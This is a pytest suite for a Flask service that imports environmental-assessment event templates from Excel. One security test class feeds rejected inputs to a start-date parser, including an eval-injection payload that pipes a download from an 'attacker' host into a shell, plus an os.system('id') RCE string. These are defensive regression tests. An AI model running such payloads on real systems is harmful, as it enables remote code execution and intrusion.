# Copyright © 2019 Province of British Columbia
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
"""Test suite for EventTemplateService."""
from io import BytesIO

import pandas as pd
import pytest
from flask import g

from api.exceptions import BadRequestError
from api.models import EventTemplate, PhaseCode
from api.models.event_template import EventPositionEnum, EventTemplateVisibilityEnum
from api.services.event_template import EventTemplateService
from tests.utilities.factory_scenarios import TestJwtClaims


class TestEventTemplateServiceInit:
    """Test EventTemplateService class initialization and basic methods."""

    def test_service_exists(self, app):
        """Test that EventTemplateService class exists and is importable."""
        with app.app_context():
            assert EventTemplateService is not None


class TestEventTemplateServiceReadExcel:
    """Test _read_excel method."""

    def test_read_excel_valid_file(self, app):
        """Test reading a valid Excel file with all required sheets."""
        with app.app_context():
            # Create a mock Excel file with required sheets
            phases_data = {
                "No": [1],
                "Name": ["Phase 1"],
                "WorkType": ["Assessment"],
                "EAAct": ["EA Act 2018"],
                "NumberOfDays": [30],
                "Color": ["#FF0000"],
                "SortOrder": [1],
                "Legislated": [True],
                "Visibility": ["REGULAR"],
            }
            events_data = {
                "No": [1],
                "Parent": [""],
                "PhaseNo": [1],
                "EventName": ["Event 1"],
                "Phase": ["Phase 1"],
                "EventType": ["Milestone"],
                "EventCategory": ["Category 1"],
                "EventPosition": ["START"],
                "MultipleDays": [False],
                "NumberOfDays": [0],
                "StartAt": ["0"],
                "Visibility": ["MANDATORY"],
                "SortOrder": [1],
            }
            outcomes_data = {
                "No": [1],
                "TemplateNo": [1],
                "TemplateName": ["Event 1"],
                "OutcomeName": ["Outcome 1"],
                "SortOrder": [1],
            }
            actions_data = {
                "No": [1],
                "OutcomeNo": [1],
                "OutcomeName": ["Outcome 1"],
                "ActionName": ["Action 1"],
                "ActionDescription": ["Description"],
                "AdditionalParams": ["{}"],
                "SortOrder": [1],
            }

            # Create Excel file in memory
            output = BytesIO()
            with pd.ExcelWriter(output, engine="openpyxl") as writer:
                pd.DataFrame(phases_data).to_excel(writer, sheet_name="Phases", index=False)
                pd.DataFrame(events_data).to_excel(writer, sheet_name="Events", index=False)
                pd.DataFrame(outcomes_data).to_excel(writer, sheet_name="Outcomes", index=False)
                pd.DataFrame(actions_data).to_excel(writer, sheet_name="Actions", index=False)
            output.seek(0)

            result = EventTemplateService._read_excel(output)

            assert "Phases" in result
            assert "Events" in result
            assert "Outcomes" in result
            assert "Actions" in result
            assert isinstance(result["Phases"], pd.DataFrame)
            assert isinstance(result["Events"], pd.DataFrame)
            assert len(result["Phases"]) == 1

    def test_read_excel_missing_sheets(self, app):
        """Test reading an Excel file with missing required sheets."""
        with app.app_context():
            # Create Excel file with only one sheet
            output = BytesIO()
            with pd.ExcelWriter(output, engine="openpyxl") as writer:
                pd.DataFrame({"Name": ["Phase 1"]}).to_excel(
                    writer, sheet_name="Phases", index=False
                )
            output.seek(0)

            with pytest.raises(BadRequestError) as exc_info:
                EventTemplateService._read_excel(output)

            assert "Sheets missing" in str(exc_info.value)

    def test_read_excel_column_renaming(self, app):
        """Test that columns are properly renamed from Excel headers."""
        with app.app_context():
            phases_data = {
                "No": [1],
                "Name": ["Phase 1"],
                "WorkType": ["Assessment"],
                "EAAct": ["EA Act 2018"],
                "NumberOfDays": [30],
                "Color": ["#FF0000"],
                "SortOrder": [1],
                "Legislated": [True],
                "Visibility": ["REGULAR"],
            }
            events_data = {
                "No": [1],
                "Parent": [""],
                "PhaseNo": [1],
                "EventName": ["Event 1"],
                "Phase": ["Phase 1"],
                "EventType": ["Milestone"],
                "EventCategory": ["Category 1"],
                "EventPosition": ["START"],
                "MultipleDays": [False],
                "NumberOfDays": [0],
                "StartAt": ["0"],
                "Visibility": ["MANDATORY"],
                "SortOrder": [1],
            }
            outcomes_data = {
                "No": [1],
                "TemplateNo": [1],
                "TemplateName": ["Event 1"],
                "OutcomeName": ["Outcome 1"],
                "SortOrder": [1],
            }
            actions_data = {
                "No": [1],
                "OutcomeNo": [1],
                "OutcomeName": ["Outcome 1"],
                "ActionName": ["Action 1"],
                "ActionDescription": ["Description"],
                "AdditionalParams": ["{}"],
                "SortOrder": [1],
            }

            output = BytesIO()
            with pd.ExcelWriter(output, engine="openpyxl") as writer:
                pd.DataFrame(phases_data).to_excel(writer, sheet_name="Phases", index=False)
                pd.DataFrame(events_data).to_excel(writer, sheet_name="Events", index=False)
                pd.DataFrame(outcomes_data).to_excel(writer, sheet_name="Outcomes", index=False)
                pd.DataFrame(actions_data).to_excel(writer, sheet_name="Actions", index=False)
            output.seek(0)

            result = EventTemplateService._read_excel(output)

            # Check that columns are renamed to snake_case
            assert "name" in result["Phases"].columns
            assert "work_type_id" in result["Phases"].columns
            assert "ea_act_id" in result["Phases"].columns
            assert "number_of_days" in result["Phases"].columns
            assert "event_type_id" in result["Events"].columns
            assert "event_category_id" in result["Events"].columns


class TestEventTemplateServiceGetLookupEntities:
    """Test _get_event_configuration_lookup_entities method."""

    def test_get_lookup_entities(self, app, db):
        """Test fetching lookup entities."""
        with app.app_context():
            g.jwt_oidc_token_info = TestJwtClaims.staff_admin_role

            (
                work_types,
                ea_acts,
                event_types,
                event_categories,
                actions,
            ) = EventTemplateService._get_event_configuration_lookup_entities()

            # These should return lists (may be empty in test DB)
            assert isinstance(work_types, list)
            assert isinstance(ea_acts, list)
            assert isinstance(event_types, list)
            assert isinstance(event_categories, list)
            assert isinstance(actions, list)


class TestEventTemplateServiceFindByPhaseId:
    """Test find_by_phase_id method."""

    def test_find_by_phase_id_no_templates(self, app, db):
        """Test finding templates when none exist for phase."""
        with app.app_context():
            g.jwt_oidc_token_info = TestJwtClaims.staff_admin_role

            # Use a phase_id that likely doesn't exist
            result = EventTemplateService.find_by_phase_id(999999)

            assert result == []

    def test_find_by_phase_id_returns_list(self, app, db):
        """Test that find_by_phase_id returns a list."""
        with app.app_context():
            g.jwt_oidc_token_info = TestJwtClaims.staff_admin_role

            # Get first phase code if exists
            phase = PhaseCode.query.first()
            if phase:
                result = EventTemplateService.find_by_phase_id(phase.id)
                assert isinstance(result, list)


class TestEventTemplateServiceFindByPhaseIds:
    """Test find_by_phase_ids method."""

    def test_find_by_phase_ids_empty_list(self, app, db):
        """Test finding templates with empty phase_ids list."""
        with app.app_context():
            g.jwt_oidc_token_info = TestJwtClaims.staff_admin_role

            result = EventTemplateService.find_by_phase_ids([])

            assert result == []

    def test_find_by_phase_ids_no_matching(self, app, db):
        """Test finding templates when none match."""
        with app.app_context():
            g.jwt_oidc_token_info = TestJwtClaims.staff_admin_role

            result = EventTemplateService.find_by_phase_ids([999998, 999999])

            assert result == []

    def test_find_by_phase_ids_returns_list(self, app, db):
        """Test that find_by_phase_ids returns a list."""
        with app.app_context():
            g.jwt_oidc_token_info = TestJwtClaims.staff_admin_role

            # Get first two phase codes if exist
            phases = PhaseCode.query.limit(2).all()
            if phases:
                phase_ids = [p.id for p in phases]
                result = EventTemplateService.find_by_phase_ids(phase_ids)
                assert isinstance(result, list)


class TestEventTemplateServiceSaveEventTemplate:
    """Test _save_event_template method."""

    def test_save_event_template_new(self, app, db):
        """Test saving a new event template when no existing match."""
        with app.app_context():
            g.jwt_oidc_token_info = TestJwtClaims.staff_admin_role

            # Get required entities
            phase = PhaseCode.query.first()
            if not phase:
                pytest.skip("No phase codes in test database")

            from api.models import EventType, EventCategory
            event_type = EventType.query.first()
            event_category = EventCategory.query.first()

            if not event_type or not event_category:
                pytest.skip("Missing required lookup entities")

            existing_events = []
            event_data = {
                "name": "Test Event Template",
                "phase_id": phase.id,
                "event_type_id": event_type.id,
                "event_category_id": event_category.id,
                "event_position": EventPositionEnum.START.value,
                "multiple_days": False,
                "number_of_days": 0,
                "start_at": "0",
                "visibility": EventTemplateVisibilityEnum.MANDATORY.value,
                "sort_order": 999,
            }

            result = EventTemplateService._save_event_template(
                existing_events, event_data, phase.id
            )

            assert result is not None
            assert result.name == "Test Event Template"
            assert result.phase_id == phase.id

    def test_save_event_template_update_existing(self, app, db):
        """Test updating an existing event template."""
        with app.app_context():
            g.jwt_oidc_token_info = TestJwtClaims.staff_admin_role

            # Get an existing template
            existing_template = EventTemplate.query.first()
            if not existing_template:
                pytest.skip("No existing event templates in test database")

            existing_events = [existing_template]
            event_data = {
                "name": existing_template.name,
                "phase_id": existing_template.phase_id,
                "event_type_id": existing_template.event_type_id,
                "event_category_id": existing_template.event_category_id,
                "event_position": existing_template.event_position.value if existing_template.event_position else EventPositionEnum.START.value,
                "multiple_days": existing_template.multiple_days,
                "number_of_days": existing_template.number_of_days,
                "start_at": str(existing_template.start_at or "0"),
                "visibility": existing_template.visibility.value if existing_template.visibility else EventTemplateVisibilityEnum.MANDATORY.value,
                "sort_order": existing_template.sort_order,
            }

            result = EventTemplateService._save_event_template(
                existing_events, event_data, existing_template.phase_id
            )

            assert result is not None
            assert any(
                e.name == event_data["name"]
                and e.phase_id == existing_template.phase_id
                and e.parent_id == existing_template.parent_id
                and e.event_type_id == event_data["event_type_id"]
                and e.event_category_id == event_data["event_category_id"]
                for e in existing_events
            )


class TestEventTemplateServiceHandleOutcomes:
    """Test _handle_outcomes method."""

    def test_handle_outcomes_empty_list(self, app, db):
        """Test handling outcomes when none match the event."""
        with app.app_context():
            g.jwt_oidc_token_info = TestJwtClaims.staff_admin_role

            outcome_data = {
                "no": [],
                "template_no": [],
                "event_template_id": [],
                "name": [],
                "sort_order": [],
            }
            outcome_dict = pd.DataFrame(outcome_data)
            action_data = {
                "no": [],
                "outcome_no": [],
                "outcome_id": [],
                "action_id": [],
                "description": [],
                "additional_params": [],
                "sort_order": [],
            }
            action_dict = pd.DataFrame(action_data)

            event = {"no": 999}  # No matching outcomes

            result = EventTemplateService._handle_outcomes(
                outcome_dict=outcome_dict,
                existing_outcomes=[],
                existing_actions=[],
                action_dict=action_dict,
                event=event,
            )

            assert result == []


class TestEventTemplateServiceHandleDeletionTemplates:
    """Test _handle_deletion_templates method."""

    def test_handle_deletion_templates_no_deletions(self, app, db):
        """Test handling deletion when all items are incoming."""
        with app.app_context():
            g.jwt_oidc_token_info = TestJwtClaims.staff_admin_role

            existing_events = []
            existing_outcomes = []
            existing_actions = []
            results = []
            phase_id = 1

            # Should not raise any exceptions
            EventTemplateService._handle_deletion_templates(
                existing_events,
                existing_outcomes,
                existing_actions,
                results,
                phase_id,
            )


class TestEventTemplateServiceImportEventsTemplate:
    """Test import_events_template method."""

    def test_import_events_template_returns_thread(self, app, db):
        """Test that import_events_template returns a thread."""
        with app.app_context():
            g.jwt_oidc_token_info = TestJwtClaims.staff_admin_role
            g.token_info = TestJwtClaims.staff_admin_role

            # Create a valid mock Excel file
            phases_data = {
                "No": [1],
                "Name": ["Test Phase"],
                "WorkType": ["Assessment"],
                "EAAct": ["EA Act 2018"],
                "NumberOfDays": [30],
                "Color": ["#FF0000"],
                "SortOrder": [1],
                "Legislated": [True],
                "Visibility": ["REGULAR"],
            }
            events_data = {
                "No": [1],
                "Parent": [""],
                "PhaseNo": [1],
                "EventName": ["Test Event"],
                "Phase": ["Test Phase"],
                "EventType": ["Milestone"],
                "EventCategory": ["Time/Calendar"],
                "EventPosition": ["START"],
                "MultipleDays": [False],
                "NumberOfDays": [0],
                "StartAt": ["0"],
                "Visibility": ["MANDATORY"],
                "SortOrder": [1],
            }
            outcomes_data = {
                "No": [1],
                "TemplateNo": [1],
                "TemplateName": ["Test Event"],
                "OutcomeName": ["Test Outcome"],
                "SortOrder": [1],
            }
            actions_data = {
                "No": [1],
                "OutcomeNo": [1],
                "OutcomeName": ["Test Outcome"],
                "ActionName": ["NONE"],
                "ActionDescription": [""],
                "AdditionalParams": ["{}"],
                "SortOrder": [1],
            }

            output = BytesIO()
            with pd.ExcelWriter(output, engine="openpyxl") as writer:
                pd.DataFrame(phases_data).to_excel(writer, sheet_name="Phases", index=False)
                pd.DataFrame(events_data).to_excel(writer, sheet_name="Events", index=False)
                pd.DataFrame(outcomes_data).to_excel(writer, sheet_name="Outcomes", index=False)
                pd.DataFrame(actions_data).to_excel(writer, sheet_name="Actions", index=False)
            output.seek(0)

            import threading
            result = EventTemplateService.import_events_template(output)

            assert isinstance(result, threading.Thread)
            # Wait for thread to complete
            result.join(timeout=5)


class TestFindStartAtValueSecurity:
    """Security tests for the _find_start_at_value safe arithmetic parser.

    Pure-function tests: call the classmethod directly, no DB or Flask context needed.
    """

    def _svc(self):
        from api.services.event import EventService
        return EventService

    def test_plain_integer_accepted(self):
        """Plain integer strings are valid."""
        svc = self._svc()
        assert svc._find_start_at_value("0", 30) == 0
        assert svc._find_start_at_value("10", 30) == 10
        assert svc._find_start_at_value("-5", 30) == -5

    def test_number_of_days_alone_accepted(self):
        """Bare 'number_of_days' is valid and resolves to the supplied value."""
        assert self._svc()._find_start_at_value("number_of_days", 30) == 30

    def test_number_of_days_plus_offset_accepted(self):
        """'number_of_days + N' is valid."""
        assert self._svc()._find_start_at_value("number_of_days + 5", 30) == 35

    def test_number_of_days_minus_offset_accepted(self):
        """'number_of_days - N' is valid."""
        assert self._svc()._find_start_at_value("number_of_days - 3", 30) == 27

    def test_malicious_os_import_rejected(self):
        """Payload designed to exploit the old eval() branch must be rejected."""
        malicious = "__import__('os').system('curl http://attacker/x|sh') or number_of_days"
        with pytest.raises(ValueError):
            self._svc()._find_start_at_value(malicious, 30)

    def test_arbitrary_python_expression_rejected(self):
        """Any Python expression beyond the allowed forms must be rejected."""
        svc = self._svc()
        for bad in [
            "number_of_days + 1 + 1",   # chained operations
            "number_of_days ** 2",       # exponentiation not allowed
            "1 + 1",                     # no number_of_days reference
            "number_of_days+0; import os",  # semicolon injection attempt
            "eval('1')",                 # direct eval attempt
            "__import__('os').system('id') or number_of_days",  # RCE payload
        ]:
            with pytest.raises(ValueError, match="Invalid start_at"):
                svc._find_start_at_value(bad, 30)


class TestEventTemplateModel:
    """Test EventTemplate model methods."""

    def test_event_position_enum_values(self, app):
        """Test EventPositionEnum has expected values."""
        with app.app_context():
            assert EventPositionEnum.START.value == "START"
            assert EventPositionEnum.INTERMEDIATE.value == "INTERMEDIATE"
            assert EventPositionEnum.END.value == "END"

    def test_visibility_enum_values(self, app):
        """Test EventTemplateVisibilityEnum has expected values."""
        with app.app_context():
            assert EventTemplateVisibilityEnum.MANDATORY.value == "MANDATORY"
            assert EventTemplateVisibilityEnum.OPTIONAL.value == "OPTIONAL"
            assert EventTemplateVisibilityEnum.HIDDEN.value == "HIDDEN"
            assert EventTemplateVisibilityEnum.SUGGESTED.value == "SUGGESTED"

    def test_find_by_phase_id_model_method(self, app, db):
        """Test EventTemplate.find_by_phase_id model method."""
        with app.app_context():
            g.jwt_oidc_token_info = TestJwtClaims.staff_admin_role

            result = EventTemplate.find_by_phase_id(999999)

            assert isinstance(result, list)
            assert result == []

    def test_find_by_phase_ids_model_method(self, app, db):
        """Test EventTemplate.find_by_phase_ids model method."""
        with app.app_context():
            g.jwt_oidc_token_info = TestJwtClaims.staff_admin_role

            result = EventTemplate.find_by_phase_ids([999998, 999999])

            assert isinstance(result, list)
            assert result == []


class TestEventTemplateIntegration:
    """Integration tests for EventTemplate functionality."""

    def test_find_templates_by_existing_phase(self, app, db):
        """Test finding templates for an existing phase."""
        with app.app_context():
            g.jwt_oidc_token_info = TestJwtClaims.staff_admin_role

            # Get a phase that has templates
            phase_with_templates = (
                PhaseCode.query
                .filter(PhaseCode.is_active.is_(True))
                .first()
            )

            if not phase_with_templates:
                pytest.skip("No active phases in test database")

            templates = EventTemplateService.find_by_phase_id(phase_with_templates.id)

            assert isinstance(templates, list)
            # All returned templates should belong to the phase
            for template in templates:
                assert template.phase_id == phase_with_templates.id

    def test_templates_are_ordered_by_sort_order(self, app, db):
        """Test that templates are returned ordered by sort_order."""
        with app.app_context():
            g.jwt_oidc_token_info = TestJwtClaims.staff_admin_role

            # Get a phase with multiple templates
            phase = PhaseCode.query.first()
            if not phase:
                pytest.skip("No phases in test database")

            templates = EventTemplateService.find_by_phase_id(phase.id)

            if len(templates) > 1:
                # Check sort order
                for i in range(1, len(templates)):
                    assert templates[i].sort_order >= templates[i - 1].sort_order
